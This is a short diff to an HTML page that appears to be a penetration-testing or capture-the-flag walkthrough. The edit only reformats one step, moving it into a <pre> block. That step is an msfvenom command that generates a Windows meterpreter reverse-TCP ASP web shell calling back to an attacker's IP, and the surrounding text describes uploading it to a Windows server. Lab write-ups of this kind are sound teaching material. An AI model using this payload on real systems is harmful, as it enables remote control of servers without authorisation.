@@ -103,9 +103,10 @@ We downloaded the data to look for clues</p>
 <p>Since we are able to put files and execute them, we can add malware to the website
 We are going to generate a malware, with msfvenom source.
 Since it is a windows server we know it is using ASP
-<p>
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=&lt;your_port&gt; -f asp &gt; shell.asp
-</p>
+<pre>
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=&lt;your_port&gt; -f asp &gt; shell.asp
+  </pre>
+  
 <p>
     In Metasploit, use the following commands:
 </p>
